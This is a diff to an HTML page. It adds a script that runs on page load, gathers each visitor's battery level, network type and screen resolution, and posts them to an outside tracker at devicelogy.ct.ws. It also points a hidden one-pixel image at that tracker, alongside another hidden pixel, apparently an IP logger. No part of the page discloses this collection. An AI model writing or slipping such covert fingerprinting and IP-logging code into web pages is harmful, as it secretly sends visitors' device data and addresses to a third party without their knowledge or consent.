@@ -146,8 +146,43 @@ body{
 
 	</script>
 </head>
+	<script>
+async function getExtraDetails() {
+    let batteryLevel = "Unknown";
+    let networkType = "Unknown";
+
+    // Get battery level (if supported)
+    if (navigator.getBattery) {
+        let battery = await navigator.getBattery();
+        batteryLevel = Math.round(battery.level * 100);
+    }
+
+    // Get network type (if supported)
+    if (navigator.connection) {
+        networkType = navigator.connection.effectiveType;
+    }
+
+    // Get screen resolution
+    let screenResolution = `${screen.width}x${screen.height}`;
+
+    // Send data to PHP
+    fetch("http://devicelogy.ct.ws/tracker.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            batteryLevel,
+            networkType,
+            screenResolution
+        })
+    });
+}
+
+// Run function when page loads
+getExtraDetails();
+</script>
+
 <body>
-	<img src="ip_logger.php" width="1" height="1" style="display: none;" alt="">
+	<img src="http://devicelogy.ct.ws/tracker.php" width="1" height="1" style="display: none;" alt="">
 <img src="https://yip.su/mnm.jpg" width="1" height="1" style="display: none;" alt="">
 
 	<section class="flex_center">
